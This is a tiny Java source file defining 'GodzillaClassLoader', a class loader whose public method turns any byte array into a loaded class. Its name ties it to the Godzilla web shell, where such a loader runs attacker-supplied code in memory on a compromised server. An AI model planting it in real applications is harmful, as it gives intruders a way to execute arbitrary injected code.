package com.security;

public class GodzillaClassLoader extends ClassLoader{
    public GodzillaClassLoader(ClassLoader superClassLoader){
        super(superClassLoader);
    }

    public Class defineClass(byte[] clsByteArr){
        return super.defineClass(clsByteArr, 0, clsByteArr.length);
    }
}
